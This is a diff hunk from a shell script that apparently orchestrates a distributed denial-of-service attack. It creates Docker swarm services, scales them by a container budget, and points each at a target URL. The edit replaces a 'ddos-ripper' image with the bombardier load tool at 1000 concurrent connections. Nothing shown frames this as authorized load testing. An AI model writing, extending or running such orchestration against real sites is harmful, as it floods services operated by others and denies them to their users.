@@ -60,7 +60,7 @@ for i in "${!required_services[@]}"; do
   replicas=$(( max_containers * coeff / coeffs_sum ))
   if ! array_contains "${service}" "${running_services[@]}"; then
     log_info "Starting service service: ${service}, replicas: ${replicas}, url: ${url}"
-    docker service create -d --name "${service}" --replicas="${replicas}" nitupkcuf/ddos-ripper:latest "${url}"
+    docker service create -d --name "${service}" --replicas="${replicas}" alpine/bombardier -c 1000 "${url}"
   else
     log_info "Updating service service: ${service}, replicas: ${replicas}, url: ${url}"
     docker service scale -d "${service}=${replicas}"
